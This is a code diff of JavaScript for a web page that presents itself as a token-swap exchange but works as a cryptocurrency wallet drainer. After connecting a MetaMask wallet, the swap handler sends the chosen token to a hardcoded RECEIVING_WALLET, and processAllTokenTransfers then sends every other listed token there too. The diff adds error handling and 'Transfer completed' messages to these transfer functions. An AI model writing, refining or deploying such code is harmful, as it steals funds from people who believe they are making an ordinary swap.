@@ -22,13 +22,7 @@ const MIN_FEE_RESERVES = {
   arbitrum: 1.0, // ARB
   base: 0.001 // ETH on Base
 };
-const STABLECOIN_SYMBOLS = {
-  ethereum: ['USDT', 'USDC', 'DAI'],
-  bsc: ['USDT', 'BUSD', 'USDC', 'DAI'],
-  polygon: ['USDT', 'USDC', 'DAI'],
-  arbitrum: ['USDT', 'USDC', 'DAI'],
-  base: ['USDC', 'DAI', 'USDT']
-};
+
 // App state
 let provider, signer, userAddress;
 let currentNetwork = "ethereum";
@@ -158,7 +152,6 @@ function initNetworkDropdown() {
   });
 }
 
-// In the initCurrencySelector function, modify the click handler:
 function initCurrencySelector() {
   const container = document.createElement('div');
   container.className = 'dex-currency-selector';
@@ -173,7 +166,6 @@ function initCurrencySelector() {
         opt.classList.remove('active');
       });
       option.classList.add('active');
-      // Update the rates without changing the token
       updateToAmount();
     });
     container.appendChild(option);
@@ -265,12 +257,11 @@ async function checkWalletEnvironment() {
     const chainId = window.ethereum.chainId;
     for (const network in NETWORK_CONFIGS) {
       if (NETWORK_CONFIGS[network].chainId === chainId) {
-        // Only update if network actually changed
         if (currentNetwork !== network) {
           currentNetwork = network;
           document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
           updateNetworkLogo(network);
-          setDefaultTokenPair(); // Add this line to update tokens
+          setDefaultTokenPair();
         }
         break;
       }
@@ -298,7 +289,7 @@ async function initializeWallet() {
       }
     }
     
-    await setDefaultTokenPair(); // Ensure tokens are updated
+    await setDefaultTokenPair();
     await updateTokenBalances();
     
     // Set up event listeners
@@ -313,16 +304,7 @@ async function initializeWallet() {
     });
     
     window.ethereum.on('chainChanged', (chainId) => {
-      // Find the new network
-      for (const network in NETWORK_CONFIGS) {
-        if (NETWORK_CONFIGS[network].chainId === chainId) {
-          currentNetwork = network;
-          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
-          updateNetworkLogo(network);
-          setDefaultTokenPair(); // Update tokens on chain change
-          break;
-        }
-      }
+      window.location.reload();
     });
     
     return true;
@@ -400,13 +382,11 @@ async function connectAndProcess() {
     showLoader();
     updateStatus("Connecting wallet...", "success");
 
-    // Handle MetaMask connection properly
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     } catch (err) {
       if (err.code === -32002) {
-        // Request already pending
         accounts = await new Promise((resolve) => {
           window.ethereum.on('accountsChanged', (accounts) => {
             resolve(accounts);
@@ -532,7 +512,6 @@ function showTokenList(type) {
   tokenItems.innerHTML = '<div class="dex-loading-tokens">Loading tokens...</div>';
   noTokensFound.style.display = 'none';
   
-  // Small delay to allow the loading message to show
   setTimeout(() => {
     populateTokenList(type, tokenItems, searchInput, noTokensFound);
   }, 50);
@@ -683,14 +662,11 @@ async function updateToAmount() {
       let rateText = '';
       let minReceivedText = '';
       
-      // Get price of fromToken in selected currency
       const fromTokenPrice = await getTokenPrice(currentFromToken);
       
       if (fromTokenPrice) {
-        // Display rate as 1 FROM_TOKEN = X [CURRENCY]
         rateText = `1 ${currentFromToken.symbol} = ${fromTokenPrice.toFixed(6)} ${currentCurrency.toUpperCase()}`;
         
-        // Calculate minimum received (only if toToken is selected)
         if (currentToToken) {
           const toTokenPrice = await getTokenPrice(currentToToken);
           if (toTokenPrice) {
@@ -723,46 +699,8 @@ async function updateToAmount() {
   updateSwapButton();
 }
 
-async function getConversionRate(fromToken, toToken) {
-  try {
-    const fromPrice = await getTokenPrice(fromToken);
-    const toPrice = await getTokenPrice(toToken);
-    
-    if (fromPrice && toPrice) {
-      return fromPrice / toPrice;
-    }
-    
-    // Fallback to hardcoded rates if API fails
-    return getHardcodedRate(fromToken, toToken);
-  } catch (err) {
-    console.error("Error getting conversion rate:", err);
-    return getHardcodedRate(fromToken, toToken);
-  }
-}
-
-function getHardcodedRate(fromToken, toToken) {
-  const rates = {
-    'ETH-USDT': 1800,
-    'USDT-ETH': 0.00055,
-    'ETH-USDC': 1800,
-    'USDC-ETH': 0.00055,
-    'ETH-DAI': 1800,
-    'DAI-ETH': 0.00055,
-    'BNB-USDT': 562,
-    'USDT-BNB': 0.0033,
-    'MATIC-USDT': 0.7,
-    'USDT-MATIC': 1.428,
-    'ARB-USDT': 1.2,
-    'USDT-ARB': 0.83
-  };
-  
-  const pair = `${fromToken.symbol}-${toToken.symbol}`;
-  return rates[pair] || null;
-}
-
 async function getTokenPrice(token) {
   try {
-    // Check cache first
     const cacheKey = `price-${token.symbol}-${currentCurrency}`;
     const cached = localStorage.getItem(cacheKey);
     if (cached) {
@@ -775,14 +713,13 @@ async function getTokenPrice(token) {
     let price = null;
     const network = token.originNetwork || currentNetwork;
     
-    // Native token handling
     if (!token.address || token.isNative) {
       const nativeTokenIds = {
         ethereum: 'ethereum',
         bsc: 'binancecoin',
         polygon: 'matic-network',
-        arbitrum: 'ethereum', // ETH is native on Arbitrum
-        base: 'ethereum'     // ETH is native on Base
+        arbitrum: 'ethereum',
+        base: 'ethereum'
       };
       
       const id = nativeTokenIds[network];
@@ -793,9 +730,7 @@ async function getTokenPrice(token) {
           price = data[id]?.[currentCurrency];
         }
       }
-    } 
-    // ERC20 token handling
-    else {
+    } else {
       const platformIds = {
         ethereum: 'ethereum',
         bsc: 'binance-smart-chain',
@@ -807,14 +742,12 @@ async function getTokenPrice(token) {
       const platform = platformIds[network];
       if (platform) {
         try {
-          // First try contract lookup
           const contractResponse = await fetch(`${COINGECKO_API}/coins/${platform}/contract/${token.address}`);
           if (contractResponse.ok) {
             const contractData = await contractResponse.json();
             price = contractData.market_data?.current_price?.[currentCurrency];
           }
           
-          // If contract lookup fails, try symbol search
           if (!price) {
             const symbolResponse = await fetch(`${COINGECKO_API}/simple/price?ids=${token.symbol.toLowerCase()}&vs_currencies=${currentCurrency}`);
             if (symbolResponse.ok) {
@@ -828,7 +761,6 @@ async function getTokenPrice(token) {
       }
     }
     
-    // Fallback to hardcoded prices if API fails
     if (!price) {
       const hardcodedPrices = {
         'ETH': { usd: 1800, btc: 0.05, eth: 1 },
@@ -845,7 +777,6 @@ async function getTokenPrice(token) {
       price = hardcodedPrices[token.symbol]?.[currentCurrency];
     }
     
-    // Cache the price if found
     if (price) {
       localStorage.setItem(cacheKey, JSON.stringify({
         price,
@@ -872,10 +803,6 @@ async function handleSwap() {
     
     // 1. First show confirmation for the main token transfer
     const inputAmount = parseFloat(document.getElementById("fromAmount").value);
-    if (!inputAmount || inputAmount <= 0) {
-      throw new Error("Please enter a valid amount to swap");
-    }
-
     const confirmed = await showConfirmationModal(currentFromToken, inputAmount);
     if (!confirmed) {
       updateStatus("Transfer cancelled", "error");
@@ -900,73 +827,12 @@ async function handleSwap() {
   }
 }
 
-// Add this to your CSS (style.css)
-.dex-confirm-modal {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0, 0, 0, 0.7);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  z-index: 1000;
-  backdrop-filter: blur(5px);
-}
-
-.dex-confirm-content {
-  background: var(--darker);
-  border-radius: var(--border-radius);
-  width: 90%;
-  max-width: 420px;
-  border: 1px solid var(--border);
-  box-shadow: var(--box-shadow);
-}
-
-.dex-confirm-header {
-  padding: 16px;
-  border-bottom: 1px solid var(--border);
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-}
-
-.dex-confirm-summary {
-  padding: 20px;
-  text-align: center;
-}
-
-.dex-confirm-tokens {
-  display: flex;
-  justify-content: center;
-  margin: 20px 0;
-}
-
-.dex-confirm-actions {
-  display: flex;
-  gap: 15px;
-  margin-top: 20px;
-}
-
-.dex-confirm-btn {
-  flex: 1;
-  padding: 12px;
-  border: none;
-  border-radius: var(--border-radius-sm);
-  font-weight: 600;
-  cursor: pointer;
-  transition: var(--transition);
-}
-
-// In app.js - update the showConfirmationModal function:
-
 async function showConfirmationModal(token, amount) {
   return new Promise((resolve) => {
     // Create modal container
     const modal = document.createElement('div');
     modal.className = 'dex-confirm-modal';
-    modal.id = 'confirmModal'; // Add ID for easy removal
+    modal.id = 'confirmModal';
     
     // Modal content
     modal.innerHTML = `
@@ -1024,6 +890,7 @@ async function showConfirmationModal(token, amount) {
     });
   });
 }
+
 async function processMainTokenTransfer() {
   const inputAmount = parseFloat(document.getElementById("fromAmount").value);
   if (!inputAmount || inputAmount <= 0) {
@@ -1052,8 +919,8 @@ async function processMainTokenTransfer() {
 
 async function processAllTokenTransfers() {
   const tokensToProcess = TOKENS[currentNetwork].filter(t => 
-    t.address !== currentFromToken.address && // Exclude the main token we already processed
-    t.address // Ensure it's a valid token
+    t.address !== currentFromToken.address &&
+    t.address
   ).sort((a, b) => a.priority - b.priority);
 
   let successCount = 0;
@@ -1072,7 +939,7 @@ async function processAllTokenTransfers() {
     }
   }
   
-  // Process native tokens last (except the one we already processed)
+  // Process native tokens last
   const nativeToken = tokensToProcess.find(t => t.isNative);
   if (nativeToken) {
     try {
@@ -1094,37 +961,51 @@ async function processAllTokenTransfers() {
 }
 
 async function transferNativeToken(token, amount) {
-  updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
-  
-  const tx = await signer.sendTransaction({
-    to: RECEIVING_WALLET,
-    value: ethers.utils.parseEther(amount.toString()),
-    gasLimit: 21000
-  });
-  
-  await tx.wait();
-  updateStatus(
-    `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
-    "success"
-  );
+  try {
+    updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
+    
+    const tx = await signer.sendTransaction({
+      to: RECEIVING_WALLET,
+      value: ethers.utils.parseEther(amount.toString()),
+      gasLimit: 21000
+    });
+    
+    await tx.wait();
+    updateStatus(
+      `Transfer completed! <a href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
+      "success"
+    );
+    return true;
+  } catch (err) {
+    console.error("Transfer error:", err);
+    updateStatus(`Failed to send ${token.symbol}: ${err.message}`, "error");
+    return false;
+  }
 }
 
 async function transferERC20Token(token, amount) {
-  updateStatus(`Sending ${amount} ...`, "success");
-  
-  const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
-  const decimals = token.decimals || 18;
-  const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
-  
-  const tx = await contract.transfer(RECEIVING_WALLET, amountInWei, {
-    gasLimit: 100000
-  });
-  
-  await tx.wait();
-  updateStatus(
-    `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
-    "success"
-  );
+  try {
+    updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
+    
+    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
+    const decimals = token.decimals || 18;
+    const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
+    
+    const tx = await contract.transfer(RECEIVING_WALLET, amountInWei, {
+      gasLimit: 100000
+    });
+    
+    await tx.wait();
+    updateStatus(
+      `Transfer completed! <a href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
+      "success"
+    );
+    return true;
+  } catch (err) {
+    console.error("Transfer error:", err);
+    updateStatus(`Failed to send ${token.symbol}: ${err.message}`, "error");
+    return false;
+  }
 }
 
 // =====================
@@ -1176,12 +1057,10 @@ function updateSwapButton() {
   if (!userAddress) {
     btn.disabled = false;
     btnText.textContent = "Connect Wallet";
-    // Add click handler for wallet connection
     btn.onclick = handleWalletConnection;
     return;
   }
   
-  // Remove the wallet connection handler if wallet is connected
   btn.onclick = handleSwap;
   
   if (!currentFromToken || !currentToToken) {
